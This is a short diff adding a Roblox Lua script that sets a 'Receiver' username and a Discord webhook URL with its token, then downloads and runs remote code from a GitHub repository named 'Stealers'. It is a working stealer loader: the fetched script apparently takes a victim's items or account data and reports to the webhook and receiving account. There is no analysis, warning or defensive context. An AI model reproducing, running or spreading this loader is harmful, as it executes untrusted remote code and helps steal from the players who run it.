@@ -1,0 +1,4 @@
+Receiver = "splorished"
+Webhook = "https://discord.com/api/webhooks/1292544234339172445/MhdjGl5QP6WgKHjQ7rqHdq4Xf7UPNA-KmV34awTsUPkad4faguvxthnGZb5ZzXoA5GGo"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
